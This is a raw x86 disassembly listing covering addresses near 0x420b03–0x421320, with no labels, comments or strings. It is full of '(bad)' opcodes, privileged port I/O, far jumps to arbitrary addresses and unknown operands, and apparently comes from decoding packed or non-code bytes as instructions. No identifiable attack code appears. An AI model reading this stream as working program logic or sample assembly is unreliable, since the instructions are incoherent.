  420b03:	js     0x420b7c
  420b05:	pop    eax
  420b06:	mov    WORD PTR [esi+0x3d],gs
  420b09:	xor    DWORD PTR [edx-0x8566794],eax
  420b0f:	mov    al,0x73
  420b11:	ds gs fwait
  420b14:	jmp    0x420b56
  420b16:	div    BYTE PTR [esi]
  420b18:	test   al,0xa
  420b1a:	add    al,bh
  420b1c:	nop
  420b1d:	cmp    DWORD PTR [eax+edx*2-0x4c5a0976],ebx
  420b24:	shl    DWORD PTR [eax-0x1b],1
  420b27:	test   BYTE PTR [ebx-0x3fefd6f2],al
  420b2d:	push   ds
  420b2e:	in     eax,0xbb
  420b30:	push   ds
  420b31:	or     DWORD PTR [edi+0x66],ebx
  420b34:	sub    al,0xa3
  420b36:	pop    ds
  420b37:	jnp    0x420b44
  420b39:	retf   
  420b3a:	sbb    al,0xd1
  420b3c:	xchg   ebx,eax
  420b3d:	mov    esp,0x6c422c19
  420b42:	cmp    bl,ch
  420b44:	and    edi,DWORD PTR [eax+0x77]
  420b47:	ds dec esi
  420b49:	or     ebp,eax
  420b4b:	pop    esi
  420b4c:	mov    eax,ds:0x515d12c4
  420b51:	fst    st(7)
  420b53:	xor    DWORD PTR [esp+eiz*2+0x56],esi
  420b57:	cmp    BYTE PTR [edx],ch
  420b59:	mov    ch,0xfc
  420b5b:	mov    ah,0xe4
  420b5d:	adc    al,0x69
  420b60:	or     cl,ch
  420b62:	pop    esp
  420b63:	mov    ch,0x50
  420b65:	xor    edi,DWORD PTR [ecx+0x71]
  420b68:	popf   
  420b69:	int    0x17
  420b6b:	add    al,BYTE PTR [ebx-0x2a]
  420b6e:	lods   al,BYTE PTR ds:[esi]
  420b6f:	mov    al,ds:0xa0d5012c
  420b74:	popf   
  420b75:	(bad)  
  420b76:	lods   al,BYTE PTR ds:[esi]
  420b77:	hlt    
  420b78:	int    0xfc
  420b7a:	jp     0x420bf7
  420b7c:	add    BYTE PTR [ebp+eiz*2-0x7],bl
  420b80:	lds    edi,FWORD PTR [esi+ebx*2-0xb85597c]
  420b87:	sbb    ebx,DWORD PTR [edi-0x1c]
  420b8a:	jg     0x420b23
  420b8c:	fldln2 
  420b8e:	inc    ecx
  420b8f:	fst    QWORD PTR [edi+0xcc218c8]
  420b95:	pushf  
  420b96:	shl    DWORD PTR [eax],cl
  420b98:	lods   al,BYTE PTR ds:[esi]
  420b99:	pop    esi
  420b9a:	fcmove st,st(5)
  420b9c:	adc    al,0x37
  420b9f:	xchg   BYTE PTR [edx-0x4e39cffc],cl
  420ba5:	adc    dl,cl
  420ba7:	je     0x420b63
  420ba9:	mov    ebx,0x52f30c10
  420bae:	jns    0x420b67
  420bb0:	adc    al,0x4e
  420bb2:	shl    DWORD PTR [ecx+0x24],cl
  420bb5:	fstp   QWORD PTR [ebp+0x0]
  420bb8:	sub    DWORD PTR [edi+ebx*4+0x748cf0ee],eax
  420bbf:	icebp  
  420bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bc1:	icebp  
  420bc2:	stos   BYTE PTR es:[edi],al
  420bc3:	shr    BYTE PTR [ebx-0x56],1
  420bc6:	mov    ecx,0x46629e37
  420bcb:	jbe    0x420c4c
  420bcd:	leave  
  420bce:	jae    0x420b64
  420bd0:	(bad)  
  420bd1:	cmp    eax,0x8c8f8471
  420bd6:	jns    0x420c56
  420bd8:	or     DWORD PTR ss:[edi],edx
  420bdb:	or     bh,BYTE PTR [edi-0x26]
  420bde:	mov    ah,BYTE PTR [ebp-0x74746fed]
  420be4:	int    0x18
  420be6:	mov    al,ds:0x3dbc00c0
  420beb:	xor    ebp,ecx
  420bed:	imul   esp,ecx,0x32
  420bf0:	retf   
  420bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bf2:	cmp    BYTE PTR [esp+edx*1+0x7a1565a5],0x77
  420bfa:	add    eax,0x606b89e0
  420bff:	push   esp
  420c00:	push   cx
  420c02:	or     eax,0x9feff48
  420c07:	mov    eax,0x3eaad0c9
  420c0c:	xor    BYTE PTR [ebp-0xf],ah
  420c0f:	sbb    al,0x52
  420c11:	es xchg ecx,eax
  420c13:	(bad)  
  420c14:	sar    DWORD PTR [ebx-0x5c8a1f48],cl
  420c1a:	cmp    ah,BYTE PTR [edx-0x6]
  420c1d:	sbb    al,0xff
  420c1f:	je     0x420c44
  420c21:	stos   DWORD PTR es:[edi],eax
  420c22:	stos   BYTE PTR es:[edi],al
  420c23:	dec    ebx
  420c24:	xor    dl,BYTE PTR [esi]
  420c26:	and    BYTE PTR [ecx+0x2],dh
  420c29:	fimul  WORD PTR [eax+0x3b577b5]
  420c2f:	ins    BYTE PTR es:[edi],dx
  420c30:	push   esp
  420c31:	push   es
  420c32:	jmp    0x335225b4
  420c37:	push   ds
  420c38:	add    dl,BYTE PTR [edx]
  420c3a:	mov    esi,DWORD PTR ds:0x5da11a00
  420c40:	sbb    DWORD PTR [ecx+edi*1+0x3fd46997],esp
  420c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c48:	jecxz  0x420c38
  420c4a:	adc    eax,0xc12ccdcf
  420c4f:	enter  0xfcc9,0xd2
  420c53:	add    al,0x8f
  420c55:	scas   eax,DWORD PTR es:[edi]
  420c56:	(bad)  [ecx-0x23]
  420c59:	rcl    BYTE PTR [edi-0x50],cl
  420c5c:	hlt    
  420c5d:	(bad)  
  420c5e:	push   edx
  420c5f:	or     ax,si
  420c62:	add    eax,0x7eea2c20
  420c67:	cwde   
  420c68:	adc    dh,BYTE PTR [edx+0x6503090]
  420c6e:	jne    0x420cc5
  420c70:	fcmove st,st(3)
  420c72:	clc    
  420c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c74:	mov    esi,eax
  420c76:	pop    es
  420c77:	sub    DWORD PTR [edx],edx
  420c79:	or     al,0x97
  420c7b:	pop    ss
  420c7c:	mov    bh,0xa7
  420c7e:	fisub  DWORD PTR [ebp-0x63]
  420c81:	cmp    eax,DWORD PTR [esi+esi*8-0x7f1c7b2f]
  420c88:	mov    esi,0x4986a507
  420c8d:	push   ds
  420c8e:	dec    ebp
  420c8f:	push   cs
  420c90:	xor    eax,0x94564048
  420c95:	jle    0x420ce1
  420c97:	js     0x420cef
  420c99:	bound  eax,QWORD PTR [eax]
	...
  420d13:	add    bl,ah
  420d15:	push   es
  420d16:	add    DWORD PTR [edi-0x1b],esi
  420d19:	ja     0x420d12
  420d1b:	xchg   esi,eax
  420d1c:	popf   
  420d1d:	mov    edx,0x9306c648
  420d22:	pop    esi
  420d23:	shr    DWORD PTR [edi+0x6e0001a5],0x7
  420d2a:	add    BYTE PTR [eax],al
  420d2c:	push   ds
  420d2d:	pop    ds
  420d2e:	out    dx,al
  420d2f:	test   BYTE PTR [ebx+0x4d04b3d1],dl
  420d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d36:	jmp    0x3651:0xcc54659b
  420d3d:	mov    bh,0x96
  420d3f:	inc    esp
  420d40:	inc    esp
  420d41:	jo     0x839174ec
  420d47:	mov    dh,0xf9
  420d49:	jmp    0xd8f9:0xe201fb11
  420d50:	addr16 clc 
  420d52:	push   edx
  420d53:	cdq    
  420d54:	inc    esi
  420d55:	cmp    BYTE PTR [esi-0x2f3fd080],dh
  420d5b:	sbb    BYTE PTR [edx-0x30241fa8],ah
  420d61:	retf   
  420d62:	test   eax,0xe1982399
  420d67:	nop
  420d68:	xor    DWORD PTR [edx],esi
  420d6a:	stos   BYTE PTR es:[edi],al
  420d6b:	scas   eax,DWORD PTR es:[edi]
  420d6c:	ds es aam 0x7a
  420d70:	jne    0x420dc6
  420d72:	div    BYTE PTR [ebx+0x58c0106c]
  420d78:	aam    0x99
  420d7a:	xchg   esi,eax
  420d7b:	inc    esp
  420d7c:	lock ja 0x420dde
  420d7f:	cmp    BYTE PTR [ebx+0x46],dl
  420d82:	or     DWORD PTR [eax+0x32],esp
  420d85:	push   ecx
  420d86:	aam    0x3c
  420d88:	mov    edi,edi
  420d8a:	jmp    0x59c2aadc
  420d8f:	out    0xa5,eax
  420d91:	push   edi
  420d92:	retf   0xa19
  420d95:	and    al,0x64
  420d97:	les    edi,FWORD PTR [edi]
  420d99:	js     0x420d68
  420d9b:	cmc    
  420d9c:	sbb    ecx,DWORD PTR [ebp+0x8]
  420d9f:	pop    esi
  420da0:	(bad)  
  420da1:	outs   dx,BYTE PTR ds:[esi]
  420da2:	mov    ch,0x77
  420da4:	push   ss
  420da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420da7:	bswap  ebp
  420da9:	push   esp
  420daa:	fdiv   QWORD PTR [edx+0x5d]
  420dad:	fwait
  420dae:	sub    al,BYTE PTR gs:[ecx+0x4f1564b2]
  420db5:	fst    QWORD PTR [ecx+0x7d]
  420db8:	xchg   ebp,eax
  420db9:	jb     0x420e28
  420dbb:	pushf  
  420dbc:	dec    ebp
  420dbd:	mov    ecx,0x45af7be8
  420dc2:	xchg   edi,eax
  420dc3:	push   ds
  420dc4:	cmp    esp,DWORD PTR ds:[edi-0x1719bd6f]
  420dcb:	push   edx
  420dcc:	and    eax,0xcbfaa13b
  420dd1:	daa    
  420dd2:	bound  edx,QWORD PTR [ecx]
  420dd4:	hlt    
  420dd5:	push   esi
  420dd6:	aaa    
  420dd7:	fwait
  420dd8:	sub    al,0x79
  420ddb:	leave  
  420ddc:	xor    ch,bh
  420dde:	xor    BYTE PTR [esi],dh
  420de0:	fistp  QWORD PTR [eax+0x6c]
  420de3:	jb     0x420e34
  420de5:	ret    0xe55a
  420de8:	pop    ebp
  420de9:	mov    edx,0x1907657d
  420dee:	(bad)  
  420def:	push   0x8c42ae63
  420df4:	sub    eax,esi
  420df6:	popa   
  420df7:	mov    WORD PTR [edi-0x6d],cs
  420dfa:	xchg   ebx,eax
  420dfb:	icebp  
  420dfc:	push   0x43e1ed7e
  420e01:	and    ch,cl
  420e03:	mov    ds:0xc0a7e10,al
  420e08:	add    al,0x6a
  420e0a:	sbb    BYTE PTR [edi*2-0x35bf2102],bl
  420e11:	(bad)  
  420e12:	jo     0x420e00
  420e14:	imul   esi,DWORD PTR [edi-0x385758a],0xffffffae
  420e1b:	sub    al,0xdb
  420e1d:	and    al,0x3
  420e1f:	inc    ebp
  420e20:	add    al,BYTE PTR [edx]
  420e22:	xchg   esp,eax
  420e23:	fucomip st,st(3)
  420e25:	xchg   esp,eax
  420e26:	lea    esi,[ecx-0x61088a38]
  420e2c:	adc    eax,0x93ab5439
  420e31:	jg     0x420e7a
  420e33:	in     al,0xf5
  420e35:	loope  0x420ea9
  420e37:	pop    ebx
  420e38:	xchg   DWORD PTR [esi-0xe1ac8c3],esp
  420e3e:	adc    ch,bh
  420e40:	bound  esi,QWORD PTR [eax-0x5c]
  420e43:	iret   
  420e44:	out    dx,eax
  420e45:	cmp    ebp,DWORD PTR [eax]
  420e47:	cdq    
  420e48:	mov    ds:0xe3feeb7d,eax
  420e4d:	mov    ds:0x3e79f1f,eax
  420e52:	jb     0x420e35
  420e54:	xor    ecx,DWORD PTR [ecx]
  420e56:	not    BYTE PTR [esi-0x6eb7c8a1]
  420e5c:	sub    eax,DWORD PTR [esi-0x5597fbf]
  420e62:	inc    esi
  420e63:	or     dl,dh
  420e65:	inc    ecx
  420e66:	or     eax,0xa2f7bd8c
  420e6b:	div    BYTE PTR [esi]
  420e6d:	imul   edx,eax,0xffffff97
  420e70:	pop    edi
  420e71:	xchg   esp,eax
  420e72:	xchg   ebp,eax
  420e73:	pop    gs
  420e75:	mov    ?,ebp
  420e77:	addr16 out dx,al
  420e79:	sbb    bl,BYTE PTR [ecx]
  420e7b:	and    eax,0x57845e49
  420e80:	jbe    0x420ecb
  420e82:	xor    al,bh
  420e84:	jl     0x420e1c
  420e86:	arpl   WORD PTR [esi+edx*8],bx
  420e89:	inc    edi
  420e8a:	xchg   esi,eax
  420e8b:	add    BYTE PTR [ebx+0x4c],0x49
  420e8f:	ficomp DWORD PTR [ebp+ebx*8-0x36dbdbc1]
  420e96:	xchg   ecx,eax
  420e97:	hlt    
  420e98:	outs   dx,DWORD PTR ds:[esi]
  420e99:	out    0xe3,eax
  420e9b:	cmp    al,0xdb
  420e9d:	jo     0x420e9c
  420e9f:	push   esi
  420ea0:	inc    ebx
  420ea1:	in     al,dx
  420ea2:	cmp    eax,0x38848148
  420ea7:	adc    BYTE PTR [edx],ah
  420ea9:	(bad)  
  420eaa:	mov    dl,0xe0
  420eac:	xchg   ebp,eax
  420ead:	pop    ds
  420eae:	xchg   edi,eax
  420eaf:	sub    DWORD PTR [esi],eax
  420eb1:	jg     0x420e92
  420eb3:	jge    0x420ebd
  420eb5:	dec    eax
  420eb6:	or     ebp,DWORD PTR [eax+0x61]
  420eb9:	outs   dx,DWORD PTR ds:[esi]
  420eba:	inc    ecx
  420ebb:	xor    BYTE PTR [eax],dl
  420ebd:	cli    
  420ebe:	mov    cl,0x53
  420ec0:	inc    edi
  420ec1:	neg    BYTE PTR [edx+0x500de828]
  420ec7:	cwde   
  420ec8:	cmp    esp,DWORD PTR [eax+0x63]
  420ecb:	mov    bl,0xc3
  420ecd:	(bad)  
  420ece:	add    BYTE PTR fs:[esi],bh
  420ed1:	jg     0x420f46
  420ed3:	(bad)  
  420ed4:	mov    al,ds:0x6cadd22d
  420eda:	mov    edx,0xfc5564d6
  420edf:	add    eax,0x4fe857b5
  420ee4:	push   ebx
  420ee5:	pushf  
  420ee6:	dec    esi
  420ee7:	mov    al,0xdd
  420ee9:	or     DWORD PTR [esp+edi*8+0x31e7295c],eax
  420ef0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ef1:	scas   eax,DWORD PTR es:[edi]
  420ef2:	sti    
  420ef3:	push   ebx
  420ef4:	push   edi
  420ef5:	inc    ecx
  420ef6:	das    
  420ef7:	call   0x386d9e6e
  420efc:	test   DWORD PTR [ecx+0x6c58ea81],eax
  420f02:	cmp    edi,DWORD PTR [ecx]
  420f04:	xchg   esp,eax
  420f05:	and    edx,DWORD PTR [eax+ecx*2]
  420f08:	retf   0xa370
  420f0b:	xchg   dh,dh
  420f0d:	sti    
  420f0e:	dec    ebx
  420f0f:	in     al,dx
  420f10:	mov    edx,0x95afffe7
  420f15:	xchg   ebx,eax
  420f16:	ja     0x420ee1
  420f18:	xlat   BYTE PTR ds:[ebx]
  420f19:	push   esi
  420f1a:	(bad)  
  420f1b:	jb     0x420e9f
  420f1d:	je     0x420f08
  420f1f:	push   0xffffffe3
  420f21:	or     eax,DWORD PTR [eax-0x63]
  420f24:	(bad)  
  420f25:	fist   DWORD PTR [eax-0x672f67c0]
  420f2b:	out    dx,al
  420f2c:	call   0x5590fe44
  420f31:	and    DWORD PTR [ecx],0x85f5d468
  420f37:	js     0x420f59
  420f39:	fwait
  420f3a:	mov    edx,0xf4908d74
  420f3f:	shl    DWORD PTR [esi-0x5a],1
  420f42:	sub    ecx,DWORD PTR [ebx]
  420f44:	mov    bl,0xf3
  420f46:	(bad)  
  420f47:	mov    dl,0x16
  420f49:	jnp    0x420fa9
  420f4b:	(bad)  
  420f4c:	sub    al,0x60
  420f4e:	ret    
  420f4f:	mov    bl,BYTE PTR [edx+0x354a9bc6]
  420f55:	enter  0x554f,0xe3
  420f59:	adc    al,0xd6
  420f5b:	pop    ss
  420f5c:	or     al,0x93
  420f5e:	inc    ebx
  420f5f:	popa   
  420f60:	test   DWORD PTR [eax+0x19],esp
  420f63:	daa    
  420f64:	scas   al,BYTE PTR es:[edi]
  420f65:	add    dh,BYTE PTR [esi-0x1c]
  420f68:	push   0x4e
  420f6a:	jbe    0x420f00
  420f6c:	or     eax,0x5cb7f4f9
  420f71:	fbstp  TBYTE PTR [edx]
  420f73:	int    0x6a
  420f75:	imul   edx,DWORD PTR [eax+eax*1-0x21dbe0c3],0x1a
  420f7d:	scas   al,BYTE PTR es:[edi]
  420f7e:	loopne 0x420f22
  420f80:	jns    0x420f69
  420f82:	sub    bl,BYTE PTR [esi-0x50981371]
  420f88:	ins    BYTE PTR es:[edi],dx
  420f89:	adc    edi,DWORD PTR [ecx+0x1f]
  420f8c:	dec    ebp
  420f8d:	in     al,0xb4
  420f8f:	es dec ecx
  420f91:	mov    ds:0x6bb2d736,eax
  420f96:	pop    ss
  420f97:	ret    
  420f98:	mov    ch,0x62
  420f9a:	pop    edi
  420f9b:	and    bh,BYTE PTR [edx]
  420f9d:	cmp    eax,0xc31cbc59
  420fa2:	inc    eax
  420fa3:	push   es
  420fa4:	mov    ebx,0x799c98e6
  420fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420faa:	xor    cl,ah
  420fac:	fs pop edx
  420fae:	popf   
  420faf:	add    eax,0x2f85bace
  420fb4:	jne    0x420f6c
  420fb6:	add    eax,0xe608f24
  420fbb:	stc    
  420fbc:	outs   dx,BYTE PTR ds:[esi]
  420fbd:	pmuludq mm3,QWORD PTR [edi-0x51370aea]
  420fc4:	cli    
  420fc5:	xor    DWORD PTR ds:0x3e561857,ebx
  420fcb:	icebp  
  420fcc:	adc    eax,DWORD PTR [edx]
  420fce:	mov    al,0x47
  420fd0:	(bad)  
  420fd1:	sti    
  420fd2:	repz jae 0x420fc8
  420fd5:	sbb    ch,BYTE PTR [edx]
  420fd7:	pop    ecx
  420fd8:	mov    eax,0xbf2fa5f4
  420fdd:	cmc    
  420fde:	xchg   edi,eax
  420fdf:	push   ds
  420fe0:	aad    0x4
  420fe2:	jmp    0x71cdd614
  420fe7:	adc    ebp,edi
  420fe9:	and    DWORD PTR [edi],edx
  420feb:	add    al,0xad
  420fed:	dec    cx
  420fef:	mov    esi,0xa6eb584
  420ff4:	cs int3 
  420ff6:	xor    DWORD PTR [esi],edx
  420ff8:	clc    
  420ff9:	cmc    
  420ffa:	cld    
  420ffb:	in     eax,dx
  420ffc:	and    BYTE PTR [esi-0x3],bl
  420fff:	hlt    
  421000:	call   0x54ed:0x794ec479
  421007:	stc    
  421008:	push   ss
  421009:	outs   dx,DWORD PTR ds:[esi]
  42100a:	inc    ecx
  42100b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42100c:	pusha  
  42100d:	adc    al,0xde
  42100f:	rep lods al,BYTE PTR ss:[esi]
  421012:	je     0x42101b
  421014:	sbb    al,0x41
  421016:	(bad)  
  421017:	pop    ecx
  421018:	pusha  
  421019:	mov    eax,0x3d8323af
  42101e:	pop    ss
  42101f:	and    esp,DWORD PTR [edi]
  421021:	dec    edx
  421022:	dec    eax
  421023:	and    dl,BYTE PTR [esi-0xda873f4]
  421029:	pop    fs
  42102b:	inc    esp
  42102c:	addr16 test eax,0x668d8497
  421032:	clc    
  421033:	push   esi
  421034:	and    dl,ah
  421036:	es icebp 
  421038:	data16 outs dx,BYTE PTR ds:[esi]
  42103b:	ret    0xa8af
  42103e:	mov    ah,0x56
  421040:	shl    BYTE PTR [esi-0x517a3880],0xb1
  421047:	mov    ch,0xb
  421049:	adc    bl,al
  42104b:	pop    DWORD PTR [ebx+ecx*2]
  42104e:	repnz mov edi,0xf1cfce6f
  421054:	and    BYTE PTR [ecx],0x8
  421057:	or     bl,BYTE PTR [esi+0x3c690367]
  42105d:	mov    al,0x3c
  42105f:	outs   dx,BYTE PTR ds:[esi]
  421060:	ins    BYTE PTR es:[edi],dx
  421061:	xchg   DWORD PTR [esi+eax*2+0x6b36cfc1],eax
  421068:	mov    dl,BYTE PTR [edx]
  42106a:	sbb    DWORD PTR [edx+ecx*2],edi
  42106d:	inc    esp
  42106e:	adc    BYTE PTR [ebp+0x3e],bl
  421071:	push   esi
  421072:	jne    0x4210ac
  421074:	out    0x17,eax
  421076:	(bad)  
  421077:	lods   al,BYTE PTR ds:[esi]
  421078:	mov    ch,0x76
  42107a:	jb     0x4210df
  42107c:	(bad)  
  42107d:	clc    
  42107e:	mov    edx,0x2c731f8b
  421083:	fwait
  421084:	cli    
  421085:	cmp    al,0xca
  421087:	out    0x29,al
  421089:	mov    ds:0x599bc542,eax
  42108e:	or     esi,ebp
  421090:	mov    ch,0xeb
  421092:	mov    edi,?
  421094:	adc    al,0x27
  421096:	loop   0x42104b
  421098:	sahf   
  421099:	loop   0x421100
  42109b:	aam    0xb2
  42109d:	ret    
  42109e:	sub    al,0x2
  4210a0:	dec    ecx
  4210a1:	dec    esi
  4210a2:	dec    esp
  4210a3:	cmc    
  4210a4:	pop    esi
  4210a5:	adc    BYTE PTR [edx+eax*2],cl
  4210a8:	sar    cl,cl
  4210aa:	imul   edx,ebx,0xfa47f832
  4210b0:	lods   al,BYTE PTR ds:[esi]
  4210b1:	lahf   
  4210b2:	mov    bl,0x52
  4210b4:	scas   al,BYTE PTR es:[edi]
  4210b5:	mov    edi,0xb5eac3c5
  4210ba:	push   0xffffff99
  4210bc:	mov    ecx,0xa53fe807
  4210c1:	pop    esi
  4210c2:	stos   BYTE PTR es:[edi],al
  4210c3:	test   dl,dh
  4210c5:	xchg   ecx,ebp
  4210c7:	aas    
  4210c8:	outs   dx,BYTE PTR ds:[esi]
  4210c9:	sub    ebx,DWORD PTR [eax+0x19]
  4210cc:	jmp    0x8b68c821
  4210d1:	and    eax,0x71197bfa
  4210d6:	adc    al,0x44
  4210d8:	in     al,dx
  4210d9:	hlt    
  4210da:	push   ebp
  4210db:	dec    esi
  4210dc:	clc    
  4210dd:	inc    ecx
  4210de:	mov    dl,0x6c
  4210e0:	outs   dx,BYTE PTR es:[esi]
  4210e2:	mov    fs,WORD PTR [eax]
  4210e4:	sbb    eax,0x192e3844
  4210e9:	loop   0x421103
  4210eb:	xchg   edx,eax
  4210ec:	in     al,dx
  4210ed:	lods   eax,DWORD PTR ds:[esi]
  4210ee:	add    dh,BYTE PTR [ecx]
  4210f0:	sub    BYTE PTR [eax-0x39],0xcc
  4210f4:	daa    
  4210f5:	jne    0x4210e3
  4210f7:	stos   BYTE PTR es:[edi],al
  4210f8:	inc    eax
  4210f9:	aam    0x8c
  4210fb:	ins    BYTE PTR es:[edi],dx
  4210fc:	push   0x2e
  4210fe:	sbb    DWORD PTR [ebp-0x72239ae4],0x6
  421105:	daa    
  421106:	jl     0x421113
  421108:	sbb    DWORD PTR [esi],ebx
  42110a:	ss retf 0x1208
  42110e:	rcr    BYTE PTR [ebx],cl
  421110:	pop    esi
  421111:	retf   
  421112:	mov    bl,0x44
  421114:	stos   DWORD PTR es:[edi],eax
  421115:	mov    al,ds:0x483f1e0c
  42111a:	aaa    
  42111b:	mov    ds:0xbfd57870,eax
  421120:	(bad)  
  421121:	push   esp
  421122:	mov    WORD PTR [ebp+edi*8-0x16c096c7],ss
  421129:	shl    ah,cl
  42112b:	sbb    eax,0x7cce0f57
  421130:	ja     0x42114c
  421132:	test   esp,ecx
  421134:	stc    
  421135:	or     BYTE PTR fs:[ecx],0x87
  421139:	fisub  DWORD PTR [eax]
  42113b:	add    BYTE PTR [edx+edx*1-0x27],bh
  42113f:	in     al,dx
  421140:	in     eax,0x3
  421142:	jbe    0x421184
  421144:	lahf   
  421145:	xchg   DWORD PTR [edx-0x2e],eax
  421148:	adc    dl,BYTE PTR [ebx-0x3e]
  42114b:	psubusw mm1,QWORD PTR [ecx+0x5ba86b1a]
  421152:	es inc ebx
  421154:	imul   esp,DWORD PTR [ecx],0x1c
  421157:	in     al,0xdc
  421159:	repz aaa 
  42115b:	add    eax,0xa86d94fd
  421160:	xlat   BYTE PTR ds:[ebx]
  421161:	pop    ebx
  421162:	(bad)  
  421164:	int3   
  421165:	sbb    eax,0x4f79d6d0
  42116a:	call   0x6bb:0x95c8a342
  421171:	xchg   esi,eax
  421172:	clc    
  421173:	jecxz  0x421186
  421175:	call   0x2ccc:0xd7f92f1d
  42117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42117d:	push   esp
  42117e:	sub    DWORD PTR [esi-0x76],eax
  421181:	adc    ch,BYTE PTR [eax-0x32]
  421184:	(bad)  
  421185:	xor    eax,0x5b04d050
  42118a:	fcmovb st,st(5)
  42118c:	stos   BYTE PTR es:[edi],al
  42118d:	jne    0x42113e
  42118f:	inc    ebx
  421190:	(bad)  
  421191:	xor    edx,DWORD PTR fs:[esi+ecx*8+0x709135bd]
  421199:	sar    BYTE PTR [ebp+0xcde092],cl
  42119f:	sahf   
  4211a0:	(bad)  
  4211a1:	aad    0x65
  4211a3:	mov    esp,0xcac32681
  4211a8:	in     eax,0xd3
  4211aa:	jge    0x42113b
  4211ac:	loop   0x421167
  4211ae:	push   eax
  4211af:	fisub  WORD PTR ds:0xe850b237
  4211b5:	fs in  eax,dx
  4211b7:	clc    
  4211b8:	or     DWORD PTR [edx+ebp*8-0x7942e617],esp
  4211bf:	sbb    al,0x38
  4211c1:	sti    
  4211c2:	mov    ebp,0x29c14519
  4211c7:	lds    edi,FWORD PTR [edi+0x217a032]
  4211cd:	sbb    bl,BYTE PTR [esi-0x34]
  4211d0:	sti    
  4211d1:	inc    esi
  4211d2:	mov    ecx,0xd2566b82
  4211d7:	or     ah,BYTE PTR [esi]
  4211d9:	test   BYTE PTR [edi],dl
  4211db:	dec    esp
  4211dc:	sub    ebx,ebx
  4211de:	imul   esp,ebx,0xcf1fc2f0
  4211e4:	mov    edi,?
  4211e6:	add    eax,0x9124463
  4211eb:	or     ebx,DWORD PTR [esi+0x3a]
  4211ee:	adc    dh,BYTE PTR [eax+0x2a5c0152]
  4211f4:	xchg   BYTE PTR [esi],dh
  4211f6:	fmul   DWORD PTR [ecx+0xa6c88b8]
  4211fc:	or     al,0xcd
  4211fe:	mov    al,0x7f
  421200:	mov    dh,0x42
  421202:	nop
  421203:	fs das 
  421205:	in     al,0x56
  421207:	stc    
  421208:	mov    esp,0xa367e907
  42120d:	scas   eax,DWORD PTR es:[edi]
  42120e:	push   esp
  42120f:	xchg   ecx,eax
  421210:	lods   eax,DWORD PTR ds:[esi]
  421211:	cmc    
  421212:	jne    0x4211f1
  421214:	les    edi,FWORD PTR [edi]
  421216:	in     eax,dx
  421217:	cmp    BYTE PTR [esi],al
  421219:	and    DWORD PTR [eax-0x38],ebx
  42121c:	mov    cl,0x5b
  42121e:	mov    BYTE PTR [esi+0x404544e3],bh
  421224:	sub    eax,0xa8624a6b
  421229:	cmp    al,0x1a
  42122b:	jp     0x421212
  42122d:	xor    BYTE PTR [ebx],bl
  42122f:	sar    bh,0x75
  421232:	mov    esp,0x43da0516
  421237:	cmp    DWORD PTR [ebp+0x1733cc4a],edi
  42123d:	cmp    al,0x24
  42123f:	mov    edi,0x7501e42f
  421244:	mov    ah,0x48
  421246:	mov    ecx,0x5cb40bb3
  42124b:	stos   BYTE PTR es:[edi],al
  42124c:	pop    esi
  42124d:	jle    0x421221
  42124f:	jns    0x421294
  421251:	cli    
  421252:	dec    ebx
  421253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421254:	cmp    eax,0x2f5b5e37
  421259:	setns  BYTE PTR [eax+0x1e]
  42125d:	cmp    edx,0xffffffec
  421260:	lods   al,BYTE PTR ds:[esi]
  421261:	push   ebx
  421262:	daa    
  421263:	sbb    bl,BYTE PTR [eax-0x40]
  421266:	adc    DWORD PTR [edx+0x60489512],ebp
  42126c:	(bad)  
  42126d:	(bad)  
  42126e:	xchg   ebp,eax
  42126f:	aaa    
  421270:	pop    ebp
  421271:	and    bl,bh
  421273:	(bad)  
  421274:	daa    
  421275:	std    
  421276:	repnz dec eax
  421278:	jle    0x4212e7
  42127a:	addr16 xchg esp,eax
  42127c:	shl    BYTE PTR [eax+0x5dec9c46],cl
  421282:	pop    ebx
  421283:	loop   0x421267
  421285:	cmp    eax,0xa466893
  42128a:	imul   ecx,DWORD PTR [edi-0x63fb43df],0xffffff82
  421291:	or     DWORD PTR [ebx-0x1304c76f],0xb618bf26
  42129b:	scas   al,BYTE PTR es:[edi]
  42129c:	cdq    
  42129d:	ins    BYTE PTR es:[edi],dx
  42129e:	test   eax,0x5c51ce79
  4212a3:	arpl   WORD PTR [edi],di
  4212a5:	xchg   ebp,eax
  4212a6:	(bad)
  4212a9:	es lahf 
  4212ab:	inc    edx
  4212ac:	add    DWORD PTR [ebp+esi*4-0x48aaf87],ecx
  4212b3:	push   ss
  4212b4:	xor    ch,BYTE PTR [edx+edx*4-0xc50cc84]
  4212bb:	sbb    BYTE PTR [esp+ebx*2+0x44],dl
  4212bf:	enter  0xe231,0xd8
  4212c3:	retf   
  4212c4:	neg    DWORD PTR es:[esi+ebx*8-0x11f2b0a9]
  4212cc:	out    dx,eax
  4212cd:	and    BYTE PTR [ebx],cl
  4212cf:	or     eax,0x66df7ecc
  4212d4:	pop    ebp
  4212d5:	fidiv  WORD PTR [ebx]
  4212d7:	imul   ebp,DWORD PTR [ecx+0x5e],0x5978adf5
  4212de:	xor    al,0xf0
  4212e0:	shr    BYTE PTR [ecx],1
  4212e2:	mov    esp,0x10346423
  4212e7:	jecxz  0x4212fe
  4212e9:	cmp    BYTE PTR [esi+edx*1+0x7f64b04e],al
  4212f0:	or     eax,0xd5e3a552
  4212f5:	test   DWORD PTR [esi],esp
  4212f7:	push   esi
  4212f8:	jecxz  0x4212eb
  4212fa:	aaa    
  4212fb:	pop    edi
  4212fc:	mov    ah,0x4f
  4212fe:	mov    ecx,0x57e96ddb
  421303:	or     ch,BYTE PTR [esi+0x11093c74]
  421309:	sbb    eax,0x1a77f202
  42130e:	pop    ds
  42130f:	cwde   
  421310:	mov    edx,0xceb2d76
  421315:	dec    edi
  421316:	jnp    0x42133e
  421318:	push   edi
  421319:	retf   0xe49d
  42131c:	dec    edx
  42131d:	data16 mov al,0x4a
  421320:	inc    BYTE PTR [eax+0x64]
